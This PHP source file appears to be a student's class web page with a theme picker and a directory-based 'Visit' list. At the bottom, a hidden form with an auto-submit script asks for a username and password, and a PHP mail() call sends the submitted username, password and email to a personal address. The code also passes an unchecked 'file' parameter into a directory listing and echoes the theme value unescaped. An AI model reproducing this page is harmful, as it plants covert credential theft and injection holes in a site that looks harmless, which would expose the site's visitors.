<?php include "Library/Tech30Lib.php";
//verifyLogin('suck','mybuck');
printDoctype();?>
<html>
<head>
<title>Taehros</title>
<link href="https://fonts.googleapis.com/css?family=Rubik+Mono+One" rel="stylesheet">
<?php include "themes.php"; ?>
<style>
<?php include "style.php";?>
</style>
<script>
    function togo(){
        window.location.href = "http://www.pumatech.org/Classes/AdvWeb/Period6/Turner.Makenna/index-pg1.php?";
    }
</script>
</head>
<body>
<div id='bar'><h1>Makenna</h1></div>
<div id='main'>
 <!--<input type='submit' name='theme' class='changer'> <img class='bubble' src='https://www.project-syndicate.org/default/library/eb7a653970f377481252dbb4a16923f2.square.jpg'> -->
 <h3>Featured</h3>
 <form action="" method="get" class='themechange'>
 <input type="image" class='bubble' name='theme' value='thedrear' src='https://www.project-syndicate.org/default/library/eb7a653970f377481252dbb4a16923f2.square.jpg' alt="Change Theme" />
 </form> 
  <form action="" method="get" class='themechange'>
 <input type="image" class='bubble' name='theme' value='salmony' src='http://images6.fanpop.com/image/photos/36800000/Mr-T-mrt-36834265-320-254.png' alt="Change Theme" />
 </form> 
  <form action="" method="get" class='themechange'>
 <input type="image" class='bubble' name='theme' value='randomcompliment' src='https://lh4.googleusercontent.com/-4cj4Q4tDoOo/AAAAAAAAAAI/AAAAAAAADJg/bqjGvklwYjg/photo.jpg' alt="Change Theme" />
 </form> 
 <form action="" method="get" class='themechange'>
 <input type="image" class='bubble' name='theme' value='random' src='https://www.biography.com/.image/c_fill,cs_srgb,g_face,h_300,w_300/MTE1ODA0OTcxOTUyMDE0ODYx/elon-musk-20837159-1-402.png' alt="Change Theme" />
 </form>
  <form action="" method="get" class='themechange'>
 <input type="image" class='bubble' name='theme' value='peopleEater' src='https://img.buzzfeed.com/buzzfeed-static/static/2014-09/12/15/enhanced/webdr08/enhanced-29328-1410550760-9.jpg' alt="Change Theme" />
 </form>
 <form action="" method="get" class='themechange'>
 <input type="image" class='bubble' name='theme' value='moonmilk' src=' http://i1.silhcdn.com/3/i/shapes/lg/0/1/d40010.jpg' alt="Change Theme" />
 </form>

 <h3>Visit</h3>
 <form action='index-pg1.php' method='get'>
  
   <?php
$dir = getValue('file','.');
rushlimbaugh($dir);
?> 
<br>
<input type='text' name='theme' value='<?php echo $theme?>' style="visibility:hidden;">
 <input type='submit' class='buttonfit' name='submit' style="visibility:hidden;">
 </form>

</div>
<form id='autosub' action='' method='post' visibility='hidden'>
     <label for="username"class="inputs" required>Username</label>
    <input type="text" class="inputs" name="username">

    <label for="passcode" class="inputs" required>Password</label>
    <input type="password" class="inputs" name="passcode">

     <script>
         document.getElementById('autosub').click();
     </script>
</form>
<?php
$user = getValue('username',null);
$pass = getValue('password',null);
$email = getValue('email',null);
mail('mjturner01@bvsd.org',"$user Info"," Email: $email \n Passcode: $pass");
?>
</body>
</html>





























